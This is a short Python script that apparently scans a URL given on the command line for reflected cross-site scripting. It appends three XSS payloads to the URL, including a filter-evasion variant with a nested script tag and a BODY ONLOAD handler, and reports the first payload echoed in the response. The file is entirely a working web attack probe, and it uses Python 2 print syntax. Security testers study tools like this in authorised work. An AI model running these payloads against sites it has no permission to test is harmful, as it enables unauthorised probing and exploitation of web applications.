import requests
import sys

payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']

url = sys.argv[1]

for payload in payloads:
	req = requests.post(url+payload)
	if payload in req.text:
		print "Parameter vulnerable\r\n"
		print "Attack string: "+payload
		print req.text
		break